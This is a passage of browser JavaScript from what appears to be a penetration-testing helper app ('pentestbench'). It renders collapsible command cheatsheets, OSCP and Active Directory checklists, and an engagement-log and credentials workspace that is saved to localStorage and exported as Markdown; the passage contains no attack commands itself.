        applyCodeSpacingEl(code2);

        const html = renderCmdHighlightedSafe(step.cmd, v);
        code2.innerHTML = toSpacedLinesHtml(html);

        card.appendChild(top2);
        card.appendChild(code2);

        innerWrap.appendChild(card);
      });

      itemHead.addEventListener("click", () => {
        const isOpen = item.dataset.open === "true";
        item.dataset.open = (!isOpen).toString();
        innerWrap.style.display = isOpen ? "none" : "block";
      });

      item.appendChild(itemHead);
      item.appendChild(innerWrap);
      body.appendChild(item);
    });

    head.addEventListener("click", () => {
      const isOpen = section.dataset.open === "true";
      section.dataset.open = (!isOpen).toString();
      body.style.display = isOpen ? "none" : "grid";
    });

    section.appendChild(head);
    section.appendChild(body);
    els.cheatsContainer.appendChild(section);
  });

  restoreOpenSections(els.cheatsContainer, prevOpen);
}

async function copyCheatAll() {
  const base = getValues();
  const v = computeDerived(base);

  const out = [];
  CHEATS.forEach(group => {
    out.push(`# ${group.category}`);
    if (group.note) out.push(`> ${group.note}`);
    out.push("");
    group.items.forEach(block => {
      out.push(`## ${block.title}`);
      if (block.note) out.push(`> ${block.note}`);
      out.push("");
      (block.steps || []).forEach(step => {
        out.push(`### ${step.title || "Step"}`);
        out.push(renderCmdPlain(step.cmd, v));
        out.push("");
      });
    });
  });

  await copy(out.join("\n"));
}

function workspaceToMarkdown() {
  const log = els.wsLog.value || "";
  const checklist = els.wsChecklist.value || "";
  const creds = els.wsCreds.value || "";

  return [
    "# Workspace",
    "",
    "## Engagement Log",
    "```",
    log.trimEnd(),
    "```",
    "",
    "## Checklist",
    "```",
    checklist.trimEnd(),
    "```",
    "",
    "## Creds",
    "```",
    creds.trimEnd(),
    "```",
    ""
  ].join("\n");
}

function exportWorkspace() {
  const md = workspaceToMarkdown();
  const blob = new Blob([md], { type: "text/markdown;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "pentestbench_workspace.md";
  a.click();
  URL.revokeObjectURL(url);
  toast("Exportado.");
}

function renderAll() {
  const tags = buildTagSet(getRecipes());
  renderTagChips(tags);
  renderCommands();
  renderCheatsheet();
}

function bind() {
  els.tabs.forEach(b => b.addEventListener("click", () => setTab(b.dataset.tab)));

  [
    els.profile, els.ip, els.port, els.url, els.domain, els.user, els.pass,
    els.wordlist, els.hashfile, els.lhost, els.lport, els.iface, els.proxy
  ].forEach(el => {
    el.addEventListener("input", () => {
      renderCommands();
      renderCheatsheet();
      renderOscpStandalone();
      renderAdChecklist();
    });
    el.addEventListener("change", () => {
      renderCommands();
      renderCheatsheet();
      renderOscpStandalone();
      renderAdChecklist();
    });
  });

  els.btnClearSearch.addEventListener("click", () => {
    els.cmdSearch.value = "";
    renderCommands();
  });

  els.cmdSearch.addEventListener("input", () => renderCommands());

  els.btnResetAll.addEventListener("click", resetAll);

  els.btnToggleAll.addEventListener("click", () => expandAll(!allExpanded));

  els.wsLog.addEventListener("input", persistWorkspace);
  els.wsChecklist.addEventListener("input", persistWorkspace);
  els.wsCreds.addEventListener("input", persistWorkspace);

  els.btnWsInsertTs.addEventListener("click", () => {
    const stamp = `[${nowStamp()}] `;
    const cur = els.wsLog.value || "";
    els.wsLog.value = cur ? `${cur.trimEnd()}\n${stamp}` : stamp;
    persistWorkspace();
    toast("Timestamp inserido.");
  });

  els.btnWsCopyMd.addEventListener("click", async () => copy(workspaceToMarkdown()));
  els.btnWsExport.addEventListener("click", exportWorkspace);

  els.btnWsClear.addEventListener("click", () => {
    els.wsLog.value = "";
    els.wsChecklist.value = "";
    els.wsCreds.value = "";
    persistWorkspace();
    toast("Workspace limpo.");
  });


  let oscpApi = null;
  let adApi = null;

  function renderOscpStandalone() {
    const slot = els.oscpSlot ? els.oscpSlot.value : "1";
    oscpApi = renderChecklistInto(
      els.oscpContainer,
      OSCP_STANDALONE_CHECKLIST,
      STORE.oscpStandalone,
      slot,
      `OSCP Standalone Checklist (Slot ${slot})`
    );
  }

  function renderAdChecklist() {
    adApi = renderChecklistInto(
      els.adContainer,
      AD_CHECKLIST,
      STORE.adChecklist,
      "ad",
      "AD Checklist"
    );
  }

  if (els.oscpSlot) {
    els.oscpSlot.addEventListener("change", () => {
      renderOscpStandalone();
      toast(`Slot ${els.oscpSlot.value} carregado.`);
    });
  }

  if (els.btnOscpExpandAll) els.btnOscpExpandAll.addEventListener("click", () => oscpApi && oscpApi.expandAll(true));
  if (els.btnOscpCollapseAll) els.btnOscpCollapseAll.addEventListener("click", () => oscpApi && oscpApi.expandAll(false));
  if (els.btnOscpReset) els.btnOscpReset.addEventListener("click", () => oscpApi && oscpApi.reset());
  if (els.btnOscpExportMd) els.btnOscpExportMd.addEventListener("click", () => {
    const slot = els.oscpSlot ? els.oscpSlot.value : "1";
    oscpApi && oscpApi.exportMd(`oscp_standalone_slot_${slot}.md`);
  });

  if (els.btnAdExpandAll) els.btnAdExpandAll.addEventListener("click", () => adApi && adApi.expandAll(true));
  if (els.btnAdCollapseAll) els.btnAdCollapseAll.addEventListener("click", () => adApi && adApi.expandAll(false));
  if (els.btnAdReset) els.btnAdReset.addEventListener("click", () => adApi && adApi.reset());
  if (els.btnAdExportMd) els.btnAdExportMd.addEventListener("click", () => adApi && adApi.exportMd("oscp_ad_checklist.md"));

  renderOscpStandalone();
  renderAdChecklist();
}

function init() {
  cacheEls();

  const saved = loadJSON(STORE.values, null);
  if (saved) applyValues(saved);
  else applyValues({});

  const storedRecipes = loadJSON(STORE.recipes, null);
  if (!Array.isArray(storedRecipes) || !storedRecipes.length) setRecipes(DEFAULT_RECIPES);

  els.wsLog.value = localStorage.getItem(STORE.ws_log) || "";
  els.wsChecklist.value = localStorage.getItem(STORE.ws_check) || "";
  els.wsCreds.value = localStorage.getItem(STORE.ws_creds) || "";

  bind();

  allExpanded = false;
  setToggleAllLabel();

  renderAll();
  setTab("commands");
}

document.addEventListener("DOMContentLoaded", init);
